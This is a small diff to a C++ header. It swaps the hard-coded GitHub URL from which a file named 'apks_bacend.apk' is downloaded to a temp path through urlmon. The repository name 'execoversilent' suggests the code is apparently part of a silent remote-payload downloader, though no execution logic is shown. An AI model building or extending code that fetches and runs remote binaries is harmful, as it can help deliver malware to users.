@@ -11,7 +11,7 @@
 #pragma comment(lib, "urlmon.lib")
 
 // Default GitHub Direct Download URL for apks_bacend.apk
-inline std::string g_GitHubApkUrl = "https://raw.githubusercontent.com/authmvp-dot/execoversilent/main/apks_bacend.apk";
+inline std::string g_GitHubApkUrl = "https://github.com/authmvp-dot/apks_bacend34/releases/download/1.0/apks_bacend.apk";
 
 inline std::string GetTempApkFilePath()
 {
